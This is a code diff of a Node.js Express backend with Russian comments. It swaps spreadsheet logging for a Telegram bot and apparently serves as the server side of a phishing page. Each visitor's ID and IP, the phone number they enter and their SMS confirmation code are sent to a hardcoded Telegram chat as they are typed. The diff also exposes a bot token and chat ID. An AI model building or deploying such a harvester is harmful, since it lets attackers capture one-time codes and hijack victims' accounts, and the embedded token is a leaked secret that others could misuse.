@@ -1,105 +1,80 @@
 const express = require('express');
 const cors = require('cors');
 const bodyParser = require('body-parser');
-const ExcelJS = require('exceljs');
-const fs = require('fs');
-const path = require('path');
 
 const app = express();
 app.use(cors());
 app.use(bodyParser.json());
-
-// Раздаем файлы сайта (HTML, CSS, JS) из текущей папки
 app.use(express.static(__dirname));
 
-const FILE_PATH = path.join(__dirname, 'data.xlsx');
+// Вставьте данные вашего бота:
+const TELEGRAM_BOT_TOKEN = '9174881478:AAGHOkgMyw3NJkjDQoxA2NXTsgcCNiBJjSo';
+const TELEGRAM_CHAT_ID = '1000389815';
 
-async function createNewExcel() {
-  const workbook = new ExcelJS.Workbook();
-  const worksheet = workbook.addWorksheet('Авторизации');
-  worksheet.columns = [
-    { header: 'ID', width: 25 },
-    { header: 'Телефон', width: 20 },
-    { header: 'Время визита', width: 25 },
-    { header: 'SMS-код', width: 15 },
-    { header: 'IP', width: 20 }
-  ];
-  await workbook.xlsx.writeFile(FILE_PATH);
-}
-
-async function getWorkbook() {
-  const workbook = new ExcelJS.Workbook();
+// Функция отправки уведомления в Telegram
+async function sendTelegramNotification(messageText) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
-    await workbook.xlsx.readFile(FILE_PATH);
-    return workbook;
-  } catch (err) {
-    await createNewExcel();
-    await workbook.xlsx.readFile(FILE_PATH);
-    return workbook;
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: messageText,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch (error) {
+    console.error('Ошибка отправки в Telegram:', error.message);
   }
 }
 
-async function initExcel() {
-  if (!fs.existsSync(FILE_PATH)) {
-    await createNewExcel();
-  }
-}
-
+// 1. Лог визита
 app.post('/api/visit', (req, res) => {
   const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   console.log(`[ВИЗИТ] ID: ${req.body.id} | IP: ${userIp}`);
+  
+  sendTelegramNotification(
+    `👀 <b>Новый визит на сайт!</b>\n` +
+    `<b>ID:</b> <code>${req.body.id}</code>\n` +
+    `<b>IP:</b> <code>${userIp}</code>`
+  );
+  
   res.json({ success: true });
 });
 
-app.post('/api/phone', async (req, res) => {
+// 2. Ввод телефона
+app.post('/api/phone', (req, res) => {
   const { id, phone, timestamp } = req.body;
   const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-  try {
-    const workbook = await getWorkbook();
-    const worksheet = workbook.getWorksheet('Авторизации') || workbook.addWorksheet('Авторизации');
+  console.log(`[ТЕЛЕФОН] ID: ${id} | Телефон: ${phone}`);
+  
+  sendTelegramNotification(
+    `📱 <b>Введен телефон!</b>\n` +
+    `<b>ID:</b> <code>${id}</code>\n` +
+    `<b>Телефон:</b> <code>${phone}</code>\n` +
+    `<b>Время:</b> ${timestamp}\n` +
+    `<b>IP:</b> <code>${userIp}</code>`
+  );
 
-    worksheet.addRow([id, phone, timestamp, '', userIp]);
-    await workbook.xlsx.writeFile(FILE_PATH);
-    console.log(`[ТЕЛЕФОН СОХРАНЕН] ID: ${id} | Телефон: ${phone}`);
-    res.json({ status: 'ok' });
-  } catch (error) {
-    console.error('Ошибка записи:', error);
-    res.status(500).json({ error: 'Ошибка записи' });
-  }
+  res.json({ status: 'ok' });
 });
 
-app.post('/api/sms', async (req, res) => {
+// 3. Ввод SMS-кода
+app.post('/api/sms', (req, res) => {
   const { id, smsCode } = req.body;
 
-  try {
-    const workbook = await getWorkbook();
-    const worksheet = workbook.getWorksheet('Авторизации') || workbook.addWorksheet('Авторизации');
+  console.log(`[SMS] ID: ${id} | Код: ${smsCode}`);
+  
+  sendTelegramNotification(
+    `🔑 <b>Введен SMS-код!</b>\n` +
+    `<b>ID:</b> <code>${id}</code>\n` +
+    `<b>Код:</b> <code>${smsCode}</code>`
+  );
 
-    let found = false;
-    worksheet.eachRow((row) => {
-      if (row.getCell(1).value === id) {
-        row.getCell(4).value = smsCode;
-        found = true;
-      }
-    });
-
-    if (!found) {
-      worksheet.addRow([id, '-', new Date().toLocaleString(), smsCode, '']);
-    }
-
-    await workbook.xlsx.writeFile(FILE_PATH);
-    console.log(`[SMS СОХРАНЕН] ID: ${id} | Код: ${smsCode}`);
-    res.json({ status: 'ok' });
-  } catch (error) {
-    console.error('Ошибка записи:', error);
-    res.status(500).json({ error: 'Ошибка записи' });
-  }
+  res.json({ status: 'ok' });
 });
 
-// Слушаем динамический порт от PaaS или 3000 локально
-const PORT = process.env.PORT || 3000;
-
-initExcel().then(() => {
-  app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
-});
+const PORT = process.env.PORT || 10000;
+app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
